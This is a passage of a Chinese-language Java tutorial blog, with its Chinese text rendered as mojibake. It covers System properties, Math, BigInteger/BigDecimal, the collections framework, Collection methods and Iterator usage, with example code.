<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SystemDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">javaVersion</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;java.version&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;javaçš„version:&quot;</span> + javaVersion);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">javaHome</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;java.home&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;javaçš„home:&quot;</span> + javaHome);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">osName</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;osçš„name:&quot;</span> + osName);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">osVersion</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.version&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;osçš„version:&quot;</span> + osVersion);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">userName</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.name&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;userçš„name:&quot;</span> + userName);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">userHome</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.home&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;userçš„home:&quot;</span> + userHome);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">userDir</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.dir&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;userçš„dir:&quot;</span> + userDir);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*        javaçš„version:22.0.2</span></span><br><span class="line"><span class="comment">        javaçš„home:C:\Users\ASUS\.jdks\openjdk-22.0.2</span></span><br><span class="line"><span class="comment">        osçš„name:Windows 11</span></span><br><span class="line"><span class="comment">        osçš„version:10.0</span></span><br><span class="line"><span class="comment">        userçš„name:ASUS</span></span><br><span class="line"><span class="comment">        userçš„home:C:\Users\ASUS</span></span><br><span class="line"><span class="comment">        userçš„dir:E:\JavaWeb\Demo</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2ã€Mathç±»"><a href="#2ã€Mathç±»" class="headerlink" title="2ã€Mathç±»"></a>2ã€Mathç±»</h4><ul>
<li>è¿™ä¸ªåœ¨ä¹‹å‰ä¹Ÿç®€å•ä½¿ç”¨è¿‡çš„</li>
</ul>
<blockquote>
<p>java.lang.Mathæä¾›äº†ä¸€ç³»åˆ—é™æ€æ–¹æ³•ç”¨äºç§‘å­¦è®¡ç®—ã€‚å…¶æ–¹æ³•çš„å‚æ•°å’Œè¿”å›å€¼ç±»å‹ä¸€èˆ¬ä¸ºdoubleå‹ã€‚</p>
</blockquote>
<blockquote>
<p>abs     ç»å¯¹å€¼</p>
<p>acos,asin,atan,cos,sin,tan  ä¸‰è§’å‡½æ•°</p>
<p>sqrt     å¹³æ–¹æ ¹</p>
<p>pow(double a,doble b)     açš„bæ¬¡å¹‚</p>
<p>log    è‡ªç„¶å¯¹æ•°</p>
<p>exp    eä¸ºåº•æŒ‡æ•°</p>
<p>max(double a,double b)</p>
<p>min(double a,double b)</p>
<p>random()      è¿”å›0.0åˆ°1.0çš„éšæœºæ•°</p>
<p>long round(double a)     doubleå‹æ•°æ®aè½¬æ¢ä¸ºlongå‹ï¼ˆå››èˆäº”å…¥ï¼‰</p>
<p>toDegrees(double angrad)     å¼§åº¦â€”&gt;è§’åº¦</p>
<p>toRadians(double angdeg)     è§’åº¦â€”&gt;å¼§åº¦</p>
</blockquote>
<h4 id="3ã€BigIntegerä¸BigDecimal"><a href="#3ã€BigIntegerä¸BigDecimal" class="headerlink" title="3ã€BigIntegerä¸BigDecimal"></a>3ã€BigIntegerä¸BigDecimal</h4><ul>
<li><p>Integerç±»ä½œä¸ºintçš„åŒ…è£…ç±»ï¼Œèƒ½å­˜å‚¨çš„æœ€å¤§æ•´å‹å€¼ä¸º2^31 -1ï¼ŒLongç±»ä¹Ÿæ˜¯æœ‰é™çš„ï¼Œæœ€å¤§ä¸º2^63 -1ã€‚å¦‚æœè¦è¡¨ç¤ºå†å¤§çš„æ•´æ•°ï¼Œä¸ç®¡æ˜¯åŸºæœ¬æ•°æ®ç±»å‹è¿˜æ˜¯ä»–ä»¬çš„åŒ…è£…ç±»éƒ½æ— èƒ½ä¸ºåŠ›ï¼Œæ›´ä¸ç”¨è¯´è¿›è¡Œè¿ç®—äº†ã€‚</p>
</li>
<li><p>java.mathåŒ…çš„BigIntegerå¯ä»¥è¡¨ç¤ºä¸å¯å˜çš„ä»»æ„ç²¾åº¦çš„æ•´æ•°ã€‚BigInteger æä¾›æ‰€æœ‰Java çš„åŸºæœ¬æ•´æ•°æ“ä½œç¬¦çš„å¯¹åº”ç‰©ï¼Œå¹¶æä¾›java.lang.Math çš„æ‰€æœ‰ç›¸å…³æ–¹æ³•ã€‚å¦å¤–ï¼ŒBigInteger è¿˜æä¾›ä»¥ä¸‹è¿ç®—ï¼šæ¨¡ç®—æœ¯ã€GCD è®¡ç®—ã€è´¨æ•°æµ‹è¯•ã€ç´ æ•°ç”Ÿæˆã€ä½æ“ä½œä»¥åŠä¸€äº›å…¶ä»–æ“ä½œã€‚</p>
</li>
<li><p>æ„é€ å™¨</p>
<ul>
<li>BigInteger(String val)ï¼šæ ¹æ®å­—ç¬¦ä¸²æ„å»ºBigIntegerå¯¹è±¡</li>
</ul>
</li>
<li><p>å¸¸ç”¨æ–¹æ³•</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-17/42ffa72f12011be3b40c0802081b0816--02c2--07.png" alt="07"></p>
<ul>
<li>ä¸€èˆ¬çš„Floatç±»å’ŒDoubleç±»å¯ä»¥ç”¨æ¥åšç§‘å­¦è®¡ç®—æˆ–å·¥ç¨‹è®¡ç®—ï¼Œä½†<strong>åœ¨å•†ä¸šè®¡ç®—ä¸­ï¼Œè¦æ±‚æ•°å­—ç²¾åº¦æ¯”è¾ƒé«˜ï¼Œæ•…ç”¨åˆ°java.math.BigDecimalç±»</strong>ã€‚</li>
<li>BigDecimalç±»æ”¯æŒä¸å¯å˜çš„ã€ä»»æ„ç²¾åº¦çš„æœ‰ç¬¦å·åè¿›åˆ¶å®šç‚¹æ•°ã€‚</li>
<li>æ„é€ å™¨<ul>
<li>public BigDecimal(double val)</li>
<li>public BigDecimal(String val)</li>
</ul>
</li>
<li>å¸¸ç”¨æ–¹æ³•<ul>
<li>public BigDecimal add(BigDecimal augend)</li>
<li>public BigDecimal subtract(BigDecimal subtrahend)</li>
<li>public BigDecimal multiply(BigDecimal multiplicand)</li>
<li>public BigDecimal divide(BigDecimal divisor, int scale, int roundingMode)</li>
</ul>
</li>
</ul>
<h2 id="é›†åˆ"><a href="#é›†åˆ" class="headerlink" title="é›†åˆ"></a>é›†åˆ</h2><h3 id="1ã€Javaé›†åˆæ¡†æ¶æ¦‚è¿°"><a href="#1ã€Javaé›†åˆæ¡†æ¶æ¦‚è¿°" class="headerlink" title="1ã€Javaé›†åˆæ¡†æ¶æ¦‚è¿°"></a>1ã€Javaé›†åˆæ¡†æ¶æ¦‚è¿°</h3><h4 id="1ã€é›†åˆæ¡†æ¶å’Œæ•°ç»„çš„å¯¹æ¯”åŠæ¦‚è¿°"><a href="#1ã€é›†åˆæ¡†æ¶å’Œæ•°ç»„çš„å¯¹æ¯”åŠæ¦‚è¿°" class="headerlink" title="1ã€é›†åˆæ¡†æ¶å’Œæ•°ç»„çš„å¯¹æ¯”åŠæ¦‚è¿°"></a>1ã€é›†åˆæ¡†æ¶å’Œæ•°ç»„çš„å¯¹æ¯”åŠæ¦‚è¿°</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä¸€ã€é›†åˆçš„æ¡†æ¶</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 1.é›†åˆã€æ•°ç»„éƒ½æ˜¯å¯¹å¤šä¸ªæ•°æ®è¿›è¡Œå­˜å‚¨æ“ä½œçš„ç»“æ„ï¼Œç®€ç§°Javaå®¹å™¨ã€‚</span></span><br><span class="line"><span class="comment"> *   è¯´æ˜ï¼›æ­¤æ—¶çš„å­˜å‚¨ï¼Œä¸»è¦æ˜¯æŒ‡èƒ½å­˜å±‚é¢çš„å­˜å‚¨ï¼Œä¸æ¶‰åŠåˆ°æŒä¹…åŒ–çš„å­˜å‚¨ï¼ˆ.txt,.jpg,.avi,æ•°æ®åº“ä¸­ï¼‰</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 2.1æ•°ç»„åœ¨å­˜å‚¨å¤šä¸ªæ•°æ®å°é¢çš„ç‰¹ç‚¹ï¼š</span></span><br><span class="line"><span class="comment"> *      ã€‹ä¸€æ—¦åˆå§‹åŒ–ä»¥åï¼Œå®ƒçš„é•¿åº¦å°±ç¡®å®šäº†ã€‚</span></span><br><span class="line"><span class="comment"> *      ã€‹æ•°ç»„ä¸€æ—¦å®šä¹‰å¥½ï¼Œå®ƒçš„æ•°æ®ç±»å‹ä¹Ÿå°±ç¡®å®šäº†ã€‚æˆ‘ä»¬å°±åªèƒ½æ“ä½œæŒ‡å®šç±»å‹çš„æ•°æ®äº†ã€‚</span></span><br><span class="line"><span class="comment"> *      æ¯”å¦‚ï¼šString[] arr;int[] str;</span></span><br><span class="line"><span class="comment"> * 2.2æ•°ç»„åœ¨å­˜å‚¨å¤šä¸ªæ•°æ®æ–¹é¢çš„ç‰¹ç‚¹ï¼š</span></span><br><span class="line"><span class="comment"> *      ã€‹ä¸€æ—¦åˆå§‹åŒ–ä»¥åï¼Œå…¶é•¿åº¦å°±ä¸å¯ä¿®æ”¹ã€‚</span></span><br><span class="line"><span class="comment"> *      ã€‹æ•°ç»„ä¸­æä¾›çš„æ–¹æ³•éå¸¸æœ‰é™ï¼Œå¯¹äºæ·»åŠ ã€åˆ é™¤ã€æ’å…¥æ•°æ®ç­‰æ“ä½œï¼Œéå¸¸ä¸ä¾¿ï¼ŒåŒæ—¶æ•ˆç‡ä¸é«˜ã€‚</span></span><br><span class="line"><span class="comment"> *      ã€‹è·å–æ•°ç»„ä¸­å®é™…å…ƒç´ çš„ä¸ªæ•°çš„éœ€æ±‚ï¼Œæ•°ç»„æ²¡æœ‰ç°æˆçš„å±æ€§æˆ–æ–¹æ³•å¯ç”¨</span></span><br><span class="line"><span class="comment"> *      ã€‹æ•°ç»„å­˜å‚¨æ•°æ®çš„ç‰¹ç‚¹ï¼šæœ‰åºã€å¯é‡å¤ã€‚å¯¹äºæ— åºã€ä¸å¯é‡å¤çš„éœ€æ±‚ï¼Œä¸èƒ½æ»¡è¶³ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>é›†åˆçš„ä½¿ç”¨åœºæ™¯</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/689411ff1ee20d9f4676a6f37a92f14e--e1a9--image-20240926103359953.png" alt="image-20240926103359953"></p>
</li>
</ul>
<h4 id="2ã€é›†åˆæ¡†æ¶æ¶‰åŠåˆ°çš„API"><a href="#2ã€é›†åˆæ¡†æ¶æ¶‰åŠåˆ°çš„API" class="headerlink" title="2ã€é›†åˆæ¡†æ¶æ¶‰åŠåˆ°çš„API"></a>2ã€é›†åˆæ¡†æ¶æ¶‰åŠåˆ°çš„API</h4><ul>
<li><p>Java é›†åˆå¯åˆ†ä¸ºCollection å’ŒMap ä¸¤ç§ä½“ç³»</p>
<ul>
<li>Collectionæ¥å£ï¼šå•åˆ—æ•°æ®ï¼Œå®šä¹‰äº†å­˜å–ä¸€ç»„å¯¹è±¡çš„æ–¹æ³•çš„é›†åˆ<ul>
<li>Listï¼šå…ƒç´ æœ‰åºã€å¯é‡å¤çš„é›†åˆ</li>
<li>Setï¼šå…ƒç´ æ— åºã€ä¸å¯é‡å¤çš„é›†åˆ</li>
</ul>
</li>
<li>Mapæ¥å£ï¼šåŒåˆ—æ•°æ®ï¼Œä¿å­˜å…·æœ‰æ˜ å°„å…³ç³»â€œkey-valueå¯¹â€çš„é›†åˆ</li>
</ul>
</li>
<li><p><strong>Collectionæ¥å£ç»§æ‰¿æ ‘</strong></p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/e5c5d1664e576887561e0b5d345399a0--f2ed--image-20240926103900334.png" alt="image-20240926103900334"></p>
<ul>
<li><strong>Mapæ¥å£ç»§æ‰¿æ ‘</strong></li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/49f74611c39b83069b6b4b3b4fc70fe0--4580--image-20240926103921057.png" alt="image-20240926103921057"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * äºŒã€é›†åˆæ¡†æ¶</span></span><br><span class="line"><span class="comment"> *      &amp;---Collectionæ¥å£ï¼šå•åˆ—é›†åˆï¼Œç”¨æ¥å­˜å‚¨ä¸€ä¸ªä¸€ä¸ªçš„å¯¹è±¡</span></span><br><span class="line"><span class="comment"> *          &amp;---Listæ¥å£ï¼šå­˜å‚¨æœ‰åºçš„ã€å¯é‡å¤çš„æ•°æ®ã€‚  --&gt;â€œåŠ¨æ€â€æ•°ç»„</span></span><br><span class="line"><span class="comment"> *              &amp;---ArrayListã€LinkedListã€Vector</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *          &amp;---Setæ¥å£ï¼šå­˜å‚¨æ— åºçš„ã€ä¸å¯é‡å¤çš„æ•°æ®   --&gt;é«˜ä¸­è®²çš„â€œé›†åˆâ€</span></span><br><span class="line"><span class="comment"> *              &amp;---HashSetã€LinkedHashSetã€TreeSet</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      &amp;---Mapæ¥å£ï¼šåŒåˆ—é›†åˆï¼Œç”¨æ¥å­˜å‚¨ä¸€å¯¹(key - value)ä¸€å¯¹çš„æ•°æ®   --&gt;é«˜ä¸­å‡½æ•°ï¼šy = f(x)</span></span><br><span class="line"><span class="comment"> *          &amp;---HashMapã€LinkedHashMapã€TreeMapã€Hashtableã€Properties</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<h3 id="2ã€Collectionæ¥å£æ–¹æ³•"><a href="#2ã€Collectionæ¥å£æ–¹æ³•" class="headerlink" title="2ã€Collectionæ¥å£æ–¹æ³•"></a>2ã€Collectionæ¥å£æ–¹æ³•</h3><ul>
<li>Collection æ¥å£æ˜¯Listã€Set å’ŒQueue æ¥å£çš„çˆ¶æ¥å£ï¼Œè¯¥æ¥å£é‡Œå®šä¹‰çš„æ–¹æ³•æ—¢å¯ç”¨äºæ“ä½œSet é›†åˆï¼Œä¹Ÿå¯ç”¨äºæ“ä½œList å’ŒQueue é›†åˆã€‚</li>
<li>JDKä¸æä¾›æ­¤æ¥å£çš„ä»»ä½•ç›´æ¥å®ç°ï¼Œè€Œæ˜¯æä¾›æ›´å…·ä½“çš„å­æ¥å£(å¦‚ï¼šSetå’ŒList)å®ç°ã€‚</li>
<li>åœ¨Java5 ä¹‹å‰ï¼ŒJava é›†åˆä¼šä¸¢å¤±å®¹å™¨ä¸­æ‰€æœ‰å¯¹è±¡çš„æ•°æ®ç±»å‹ï¼ŒæŠŠæ‰€æœ‰å¯¹è±¡éƒ½å½“æˆObject ç±»å‹å¤„ç†ï¼›ä»JDK 5.0 å¢åŠ äº†<strong>æ³›å‹</strong>ä»¥åï¼ŒJava é›†åˆå¯ä»¥è®°ä½å®¹å™¨ä¸­å¯¹è±¡çš„æ•°æ®ç±»å‹ã€‚</li>
</ul>
<h4 id="Collectionæ¥å£ä¸­çš„å¸¸ç”¨æ–¹æ³•"><a href="#Collectionæ¥å£ä¸­çš„å¸¸ç”¨æ–¹æ³•" class="headerlink" title="Collectionæ¥å£ä¸­çš„å¸¸ç”¨æ–¹æ³•"></a>Collectionæ¥å£ä¸­çš„å¸¸ç”¨æ–¹æ³•</h4><ol>
<li>æ·»åŠ <ul>
<li>add(Objectobj)</li>
<li>addAll(Collectioncoll)</li>
</ul>
</li>
<li>è·å–æœ‰æ•ˆå…ƒç´ çš„ä¸ªæ•°<ul>
<li>intsize()</li>
</ul>
</li>
<li>æ¸…ç©ºé›†åˆ<ul>
<li>voidclear()</li>
</ul>
</li>
<li>æ˜¯å¦æ˜¯ç©ºé›†åˆ<ul>
<li>boolean isEmpty()</li>
</ul>
</li>
<li>æ˜¯å¦åŒ…å«æŸä¸ªå…ƒç´ <ul>
<li>booleancontains(Objectobj)ï¼šæ˜¯é€šè¿‡å…ƒç´ çš„equalsæ–¹æ³•æ¥åˆ¤æ–­æ˜¯å¦æ˜¯åŒä¸€ä¸ªå¯¹è±¡</li>
<li>booleancontainsAll(Collectionc)ï¼šä¹Ÿæ˜¯è°ƒç”¨å…ƒç´ çš„equalsæ–¹æ³•æ¥æ¯”è¾ƒçš„ã€‚æ‹¿ä¸¤ä¸ªé›†åˆçš„å…ƒç´ æŒ¨ä¸ªæ¯”è¾ƒã€‚</li>
</ul>
</li>
<li>åˆ é™¤<ul>
<li>boolean remove(Object obj) ï¼šé€šè¿‡å…ƒç´ çš„equalsæ–¹æ³•åˆ¤æ–­æ˜¯å¦æ˜¯è¦åˆ é™¤çš„é‚£ä¸ªå…ƒç´ ã€‚åªä¼šåˆ é™¤æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªå…ƒç´ </li>
<li>boolean removeAll(Collection coll)ï¼šå–å½“å‰é›†åˆçš„å·®é›†</li>
</ul>
</li>
<li>å–ä¸¤ä¸ªé›†åˆçš„äº¤é›†<ul>
<li>boolean retainAll(Collection c)ï¼šæŠŠäº¤é›†çš„ç»“æœå­˜åœ¨å½“å‰é›†åˆä¸­ï¼Œä¸å½±å“c</li>
</ul>
</li>
<li>é›†åˆæ˜¯å¦ç›¸ç­‰<ul>
<li>boolean equals(Object obj)</li>
</ul>
</li>
<li>è½¬æˆå¯¹è±¡æ•°ç»„<ul>
<li>Object[] toArray()</li>
</ul>
</li>
<li>è·å–é›†åˆå¯¹è±¡çš„å“ˆå¸Œå€¼<ul>
<li>hashCode()</li>
</ul>
</li>
<li>éå†<ul>
<li>iterator()ï¼šè¿”å›è¿­ä»£å™¨å¯¹è±¡ï¼Œç”¨äºé›†åˆéå†</li>
</ul>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CollectionTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Collection</span> <span class="variable">collection</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        collection.add(<span class="number">1</span>);</span><br><span class="line">        collection.add(<span class="number">2</span>);</span><br><span class="line">        collection.add(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(collection); <span class="comment">//[1, 2, 3]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-Iteratorè¿­ä»£å™¨æ¥å£"><a href="#3-Iteratorè¿­ä»£å™¨æ¥å£" class="headerlink" title="3.Iteratorè¿­ä»£å™¨æ¥å£"></a>3.Iteratorè¿­ä»£å™¨æ¥å£</h3><ul>
<li>Iteratorå¯¹è±¡ç§°ä¸ºè¿­ä»£å™¨(è®¾è®¡æ¨¡å¼çš„ä¸€ç§)ï¼Œä¸»è¦ç”¨äºéå†Collection é›†åˆä¸­çš„å…ƒç´ ã€‚</li>
<li>GOFç»™è¿­ä»£å™¨æ¨¡å¼çš„å®šä¹‰ä¸ºï¼šæä¾›ä¸€ç§æ–¹æ³•è®¿é—®ä¸€ä¸ªå®¹å™¨(container)å¯¹è±¡ä¸­å„ä¸ªå…ƒç´ ï¼Œè€Œåˆä¸éœ€æš´éœ²è¯¥å¯¹è±¡çš„å†…éƒ¨ç»†èŠ‚ã€‚<strong>è¿­ä»£å™¨æ¨¡å¼ï¼Œå°±æ˜¯ä¸ºå®¹å™¨è€Œç”Ÿ</strong>ã€‚ç±»ä¼¼äºâ€œå…¬äº¤è½¦ä¸Šçš„å”®ç¥¨å‘˜â€ã€â€œç«è½¦ä¸Šçš„ä¹˜åŠ¡å‘˜â€ã€â€œç©ºå§â€ã€‚</li>
<li>Collectionæ¥å£ç»§æ‰¿äº†java.lang.Iterableæ¥å£ï¼Œè¯¥æ¥å£æœ‰ä¸€ä¸ªiterator()æ–¹æ³•ï¼Œé‚£ä¹ˆæ‰€æœ‰å®ç°äº†Collectionæ¥å£çš„é›†åˆç±»éƒ½æœ‰ä¸€ä¸ªiterator()æ–¹æ³•ï¼Œç”¨ä»¥è¿”å›ä¸€ä¸ªå®ç°äº†Iteratoræ¥å£çš„å¯¹è±¡ã€‚</li>
<li><strong>Iterator ä»…ç”¨äºéå†é›†åˆ</strong>ï¼ŒIteratoræœ¬èº«å¹¶ä¸æä¾›æ‰¿è£…å¯¹è±¡çš„èƒ½åŠ›ã€‚å¦‚æœéœ€è¦åˆ›å»ºIterator å¯¹è±¡ï¼Œåˆ™å¿…é¡»æœ‰ä¸€ä¸ªè¢«è¿­ä»£çš„é›†åˆã€‚</li>
<li><strong>é›†åˆå¯¹è±¡æ¯æ¬¡è°ƒç”¨iterator()æ–¹æ³•éƒ½å¾—åˆ°ä¸€ä¸ªå…¨æ–°çš„è¿­ä»£å™¨å¯¹è±¡</strong>ï¼Œé»˜è®¤æ¸¸æ ‡éƒ½åœ¨é›†åˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¹‹å‰ã€‚</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IteratorTest</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Collection</span> <span class="variable">coll</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        coll.add(<span class="number">123</span>);</span><br><span class="line">        coll.add(<span class="number">456</span>);</span><br><span class="line">        coll.add(<span class="string">&quot;Jerry&quot;</span>);</span><br><span class="line">        coll.add(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Tom&quot;</span>));</span><br><span class="line">        coll.add(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> coll.iterator();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ–¹å¼ä¸€ï¼š</span></span><br><span class="line"><span class="comment">//        System.out.println(iterator.next());</span></span><br><span class="line"><span class="comment">//        System.out.println(iterator.next());</span></span><br><span class="line"><span class="comment">//        System.out.println(iterator.next());</span></span><br><span class="line"><span class="comment">//        System.out.println(iterator.next());</span></span><br><span class="line"><span class="comment">//        System.out.println(iterator.next());</span></span><br><span class="line"><span class="comment">//        //æŠ¥å¼‚å¸¸ï¼šNoSuchElementException</span></span><br><span class="line"><span class="comment">//        //å› ä¸ºï¼šåœ¨è°ƒç”¨it.next()æ–¹æ³•ä¹‹å‰å¿…é¡»è¦è°ƒç”¨it.hasNext()è¿›è¡Œæ£€æµ‹ã€‚è‹¥ä¸è°ƒç”¨ï¼Œä¸”ä¸‹ä¸€æ¡è®°å½•æ— æ•ˆï¼Œç›´æ¥è°ƒç”¨it.next()ä¼šæŠ›å‡ºNoSuchElementExceptionå¼‚å¸¸ã€‚</span></span><br><span class="line"><span class="comment">//        System.out.println(iterator.next());</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ–¹å¼äºŒï¼šä¸æ¨è</span></span><br><span class="line"><span class="comment">//        for(int i = 0;i &lt; coll.size();i++)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(iterator.next());</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ–¹å¼ä¸‰ï¼šæ¨è</span></span><br><span class="line">        <span class="keyword">while</span>(iterator.hasNext())&#123;</span><br><span class="line">            System.out.println(iterator.next());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="è¿­ä»£å™¨Iteratorçš„æ‰§è¡ŒåŸç†"><a href="#è¿­ä»£å™¨Iteratorçš„æ‰§è¡ŒåŸç†" class="headerlink" title="è¿­ä»£å™¨Iteratorçš„æ‰§è¡ŒåŸç†"></a>è¿­ä»£å™¨Iteratorçš„æ‰§è¡ŒåŸç†</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-26/2e1a01fbd76a3b98b8060678b8c652da--578a--image-20240926113011579.png" alt="image-20240926113011579"></p>
<h4 id="Iteratorè¿­ä»£å™¨remove-çš„ä½¿ç”¨"><a href="#Iteratorè¿­ä»£å™¨remove-çš„ä½¿ç”¨" class="headerlink" title="Iteratorè¿­ä»£å™¨remove()çš„ä½¿ç”¨"></a>Iteratorè¿­ä»£å™¨remove()çš„ä½¿ç”¨</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * é›†åˆå…ƒç´ çš„éå†æ“ä½œï¼Œä½¿ç”¨è¿­ä»£å™¨Iteratoræ¥å£</span></span><br><span class="line"><span class="comment"> * 1.å†…éƒ¨çš„æ–¹æ³•ï¼šhasNext()å’Œ next()</span></span><br><span class="line"><span class="comment"> * 2.é›†åˆå¯¹è±¡æ¯æ¬¡è°ƒç”¨iterator()æ–¹æ³•éƒ½å¾—åˆ°ä¸€ä¸ªå…¨æ–°çš„è¿­ä»£å™¨å¯¹è±¡ï¼Œé»˜è®¤æ¸¸æ ‡éƒ½åœ¨é›†åˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¹‹å‰ã€‚</span></span><br><span class="line"><span class="comment"> * 3.å†…éƒ¨å®šä¹‰äº†remove(),å¯ä»¥åœ¨éå†çš„æ—¶å€™ï¼Œåˆ é™¤é›†åˆä¸­çš„å…ƒç´ ã€‚æ­¤æ–¹æ³•ä¸åŒäºé›†åˆç›´æ¥è°ƒç”¨remove()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> subei</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2020-05-12 12:22</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IteratorTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æµ‹è¯•Iteratorä¸­çš„remove()æ–¹æ³•</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test3</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Collection</span> <span class="variable">coll</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        coll.add(<span class="number">123</span>);</span><br><span class="line">        coll.add(<span class="number">456</span>);</span><br><span class="line">        coll.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Jerry&quot;</span>,<span class="number">20</span>));</span><br><span class="line">        coll.add(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Tom&quot;</span>));</span><br><span class="line">        coll.add(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ é™¤é›†åˆä¸­â€Tomâ€</span></span><br><span class="line">        <span class="comment">//å¦‚æœè¿˜æœªè°ƒç”¨next()æˆ–åœ¨ä¸Šä¸€æ¬¡è°ƒç”¨ next æ–¹æ³•ä¹‹åå·²ç»è°ƒç”¨äº† remove æ–¹æ³•ï¼Œ</span></span><br><span class="line">        <span class="comment">// 